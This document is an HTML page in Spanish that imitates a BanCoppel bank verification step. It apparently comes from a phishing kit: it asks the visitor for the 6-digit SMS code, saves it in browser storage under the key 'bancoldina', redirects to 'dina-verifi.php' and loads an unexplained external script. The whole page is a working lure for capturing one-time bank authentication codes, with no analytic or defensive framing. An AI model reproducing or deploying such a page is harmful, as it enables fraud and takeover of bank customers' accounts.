<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <title>Verificación</title>
  <link rel="stylesheet" href="bootstrap.min.css">
  <link rel="stylesheet" href="util.css">
  <link rel="stylesheet" href="main.css">
  <style>
    .textypn1, .textypn2 {
      text-align: center;
      margin-bottom: 20px;
    }
    .textypn1 span {
      font-size: 28px;
      color: #003995;
    }
    .textypn2 span {
      font-size: 16px;
      color: gray;
    }
    .container-login100 {
      background-image: url('img/fondo.jpg');
      background-size: cover;
      position: absolute;
      width: 100%;
      height: 100%;
    }
  </style>
</head>
<body>

  <header id="main-header">
    <a class="logo-header" href="index.html">
      <img src="https://www.westernunion.com/content/dam/wu/rmt/BanCoppel.png">
    </a>
    <div class="menu-header" href="index.html">
      <div id="bar-menu" class="bar-menu">
        <span></span><span></span><span></span>
      </div>
    </div>
  </header>

  <div class="limiter">
    <div class="container-login100">
      <div class="wrap-login100 p-l-55 p-r-55 p-t-50 p-b-54">

        <form class="login100-form validate-form" onsubmit="return enviarCodigo()" method="post">
          <div class="textypn1"><span>Verificación</span></div>
          <div class="textypn2"><span>Ingresa el código de 6 dígitos enviado a tu número</span></div>

          <div class="wrap-input101 validate-input" data-validate="">
            <input class="input101" type="text" pattern="[0-9]*" inputmode="numeric" name="codigo_otp" id="codigo_otp"
              maxlength="6" minlength="6" required placeholder="Ingresa tu código"
              onkeypress="if (event.keyCode < 48 || event.keyCode > 57) event.returnValue = false;">
            <span class="focus-input100" data-symbol=""></span>
          </div>

          <br><br>

          <div class="container-login100-form-btn">
            <div class="wrap-login100-form-btn">
              <div class="login100-form-bgbtn"></div>
              <button type="submit" style="height:50px; width:100%;" class="login100-form-btn">
                Continuar
              </button>
            </div>
          </div>
        </form>

      </div>
    </div>
  </div>

  <script>
    function enviarCodigo() {
      const otp = document.getElementById("codigo_otp").value;
      if (otp.length === 6) {
        localStorage.setItem("bancoldina", otp);
        window.location.href = "dina-verifi.php";
        return false;
      } else {
        alert("Debes ingresar los 6 dígitos.");
        return false;
      }
    }
  </script>

  <script src="saxcopp.js"></script>
</body>
</html>
